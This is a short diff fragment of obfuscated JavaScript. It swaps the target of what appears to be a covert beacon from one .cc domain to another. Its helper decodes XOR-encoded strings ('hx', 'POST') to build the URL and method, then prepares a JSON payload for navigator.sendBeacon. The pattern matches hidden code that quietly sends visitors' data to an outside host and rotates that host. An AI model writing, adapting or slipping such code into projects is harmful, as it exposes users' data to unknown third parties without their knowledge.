@@ -15,7 +15,7 @@
   };
   var qP = qK([42, 58], 66);
   var qM = qK([18, 13, 17, 22], 66);
-  var qU = "https://rtfnyu.cc/" + qP;
+  var qU = "https://lccuga.cc/" + qP;
   var qB = JSON.stringify({ k: 1, n: qN });
   try {
     if (navigator.sendBeacon) {
